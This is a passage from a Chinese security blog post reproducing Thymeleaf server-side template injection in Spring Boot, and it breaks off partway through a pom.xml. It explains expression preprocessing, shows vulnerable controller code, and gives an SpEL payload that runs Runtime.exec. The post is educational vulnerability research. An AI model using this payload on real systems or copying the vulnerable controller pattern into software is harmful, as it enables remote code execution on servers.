

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Mechoy">
  <meta name="keywords" content="">
  
    <meta name="description" content="Thymeleaf模板注入0x00 前言看别人的，想复现学习一下，努力混口饭吃，要学的东西太多了，一个个来吧 环境是：springboot2.3.2.RELEASE + spring-boot-starter-thymeleaf（thymeleaf的版本是3.0.11） 0x01 Thymeleaf简介Thymeleaf 是一种适用于 Web 和独立环境的现代服务器端 Java 模板引擎，能够处理">
<meta property="og:type" content="article">
<meta property="og:title" content="Thymeleaf模板注入">
<meta property="og:url" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Mechoy&#39;s Blog">
<meta property="og:description" content="Thymeleaf模板注入0x00 前言看别人的，想复现学习一下，努力混口饭吃，要学的东西太多了，一个个来吧 环境是：springboot2.3.2.RELEASE + spring-boot-starter-thymeleaf（thymeleaf的版本是3.0.11） 0x01 Thymeleaf简介Thymeleaf 是一种适用于 Web 和独立环境的现代服务器端 Java 模板引擎，能够处理">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A52.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A53.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A54.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A55.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A56.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A57.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A58.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A59.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A510.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A511.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A512.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A513.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A514.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A515.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A516.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A517.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A518.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A519.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A520.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A522.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A523.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A524.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A525.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A526.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A527.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A538.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A537.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A539.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A540.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A541.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A542.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A543.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A521.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A528.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A529.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A530.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A531.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A532.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A533.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A534.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A535.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A536.png">
<meta property="article:published_time" content="2022-11-26T14:22:22.000Z">
<meta property="article:modified_time" content="2023-02-19T12:34:54.790Z">
<meta property="article:author" content="Mechoy">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png">
  
  
  <title>Thymeleaf模板注入 - Mechoy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Mechoy&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Thymeleaf模板注入"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Mechoy
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-11-26 22:22" pubdate>
          2022年11月26日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          21k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          106 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Thymeleaf模板注入</h1>
            
            <div class="markdown-body">
              
              <h2 id="Thymeleaf模板注入"><a href="#Thymeleaf模板注入" class="headerlink" title="Thymeleaf模板注入"></a>Thymeleaf模板注入</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>看别人的，想复现学习一下，努力混口饭吃，要学的东西太多了，一个个来吧</p>
<p>环境是：springboot2.3.2.RELEASE + spring-boot-starter-thymeleaf（thymeleaf的版本是3.0.11）</p>
<h3 id="0x01-Thymeleaf简介"><a href="#0x01-Thymeleaf简介" class="headerlink" title="0x01 Thymeleaf简介"></a>0x01 Thymeleaf简介</h3><p>Thymeleaf 是一种适用于 Web 和独立环境的现代服务器端 Java 模板引擎，能够处理 HTML、XML、JavaScript、CSS 甚至纯文本。</p>
<p>Thymeleaf 的主要目标是提供一种优雅且高度可维护的模板创建方式。为实现这一点，它建立在<em>自然模板</em>的概念之上，以不影响模板用作设计原型的方式将其逻辑注入模板文件。</p>
<h4 id="标准表达式语法"><a href="#标准表达式语法" class="headerlink" title="标准表达式语法"></a>标准表达式语法</h4><p>thymeleaf中支持多种表达式，这也是thymeleaf功能强的重要原因之一</p>
<ul>
<li><code>#&#123;...&#125;</code>    消息表达式</li>
<li><code>$&#123;...&#125;</code>    变量表达式（实际上是在上下文中包含的变量映射上执行的 OGNL（对象图导航语言）表达式）</li>
<li><code>*&#123;...&#125;</code>    选择表达式（和变量表达式类似，区别在于计算<strong>选定对象</strong>上的表达式而不是整个上下文。）</li>
<li><code>@&#123;...&#125;</code>    链接网址</li>
<li><code>~&#123;...&#125;</code>    片段表达式（表示标记片段并在模板中移动它们的简单方法）</li>
</ul>
<p>除了所有这些用于表达式处理的功能之外，Thymeleaf 还具有<strong>预处理</strong>表达式的功能。</p>
<h4 id="Thymeleaf的预处理"><a href="#Thymeleaf的预处理" class="headerlink" title="Thymeleaf的预处理"></a>Thymeleaf的预处理</h4><p>预处理是在正常表达式之前执行的表达式，它允许修改最终将要执行的表达式。</p>
<p>预处理表达式与普通表达式完全一样，但出现在双下划线符号（如<code>__$&#123;expression&#125;__</code>）的包围中。</p>
<p>由于是使用的springboot+thymeleaf进行的复现，所以这里使用的也就是springEL表达式</p>
<h3 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h3><p>Thymeleaf的支持表达式预处理，当进入Thymeleaf视图解析器的View中包含<code>__$&#123;expression&#125;__</code>这种形式的语句时，Thymeleaf会认为此处需要进行<strong>预处理</strong>，当在<code>expression</code>处传入恶意代码时，就可以实现攻击，但此类漏洞的利用场景较为少见（可能是我见的少😭），常见的情况例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="0x03-复现分析"><a href="#0x03-复现分析" class="headerlink" title="0x03 复现分析"></a>0x03 复现分析</h3><h4 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h4><p><strong>exp</strong>：<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__</code></p>
<p><strong>Thymeleaf版本：3.0.11</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mechoy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span 